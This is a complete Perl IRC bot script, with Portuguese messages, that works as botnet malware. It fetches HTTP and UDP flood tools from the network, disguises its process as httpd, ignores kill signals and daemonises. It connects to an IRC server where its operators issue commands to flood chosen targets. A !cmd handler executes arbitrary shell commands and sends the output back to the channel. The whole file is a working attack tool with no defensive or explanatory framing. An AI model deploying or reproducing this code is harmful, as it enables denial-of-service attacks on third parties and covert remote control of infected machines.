#!usr/bin/perl
                                   
use IO::Socket;
my $processo = '/usr/sbin/httpd'; #processo fake
my $server  = "irc.priv8.jp"; 
my $code = int(rand(100000));
my $channel = "#js";
my $port    =   6667;
my $nick    ="bx|$code";

unless (-e "hulk.py") { 
  print "[*] Instalando o HULK... ";
  system("wget https://raw.githubusercontent.com/grafov/hulk/master/hulk.py -O hulk.py --no-check-certificate");
}

unless (-e "goldeneye.py") { 
  print "[*] Instalando o Goldeneye... ";
  system("wget https://raw.githubusercontent.com/jseidl/GoldenEye/master/goldeneye.py -O goldeneye.py --no-check-certificate");
}

unless (-e "udp.pl") { 
  print "[*] Instalando Buffalozika... ";
  system("wget https://ghostbin.com/paste/af4d5/raw -O udp.pl --no-check-certificate");
}
all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$bposix = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$bposix ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $bposix "NICK $nick\r\n";
print $bposix "USER $nick 1 1 1 1\r\n";

print "Online ;)\n\n";
while ( my $log = <$bposix> ) {
      chomp($log);
      if ( $log =~ m/^PING(.*)$/i ) {
        print $bposix "PONG $1\r\n";
        print $bposix "JOIN $channel\r\n";
      }

      if ( $log =~ m/:!hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $bposix "PRIVMSG $channel :14,1[ 15,1HULK14,01 ]04,01 Atacando14,0108,01 $104,01 Para cancelar o ataque14,01:08,01 !stophulk \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stophulk/g ){##########
        print $bposix "PRIVMSG $channel :14,1[ 15,1HULK14,01 ]04,01 Ataque finalizado! \r\n";
        system("pkill -9 -f hulk");
      }

      if ( $log =~ m/:!gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $bposix "PRIVMSG $channel :14,1[ 15,1GOLDENEYE14,01 ]04,01 Atacando14,0108,01 $104,01 Para cancelar o ataque14,01:08,01 !stopgold \r\n";
        system("nohup python goldeneye.py $target_gold -w 15 -s 650 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopgold/g ){##########
        print $bposix "PRIVMSG $channel :14,1[ 15,1GOLDENEYE14,01 ]04,01 Ataque finalizado! \r\n";
        system("pkill -9 -f goldeneye");
      }

      if ( $log =~ m/:!udp (.*) (.*)$/g ){##########
        my $target_udp = $1;
  my $port_udp = $2;
        print $bposix "PRIVMSG $channel :14,1[ 15,1UDP14,01 ]04,01 Atacando14,0108,01 $104,01 Para cancelar o ataque14,01:08,01 !stopudp04,01 \r\n";
        system("nohup perl udp.pl $target_udp --port $port_udp > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopudp/g ){##########
        print $bposix "PRIVMSG $channel :14,1[ 15,1UDP14,01 ]04,01 Ataque finalizado! \r\n";
        system("pkill -9 -f udp");
      }

      if ( $log =~ m/:!cmd (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);

        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $bposix "PRIVMSG $channel :14,1[ 15,1CMD14,01 ]04,01 Output14,01 => $comando_each \r\n";
       }
   }
}
}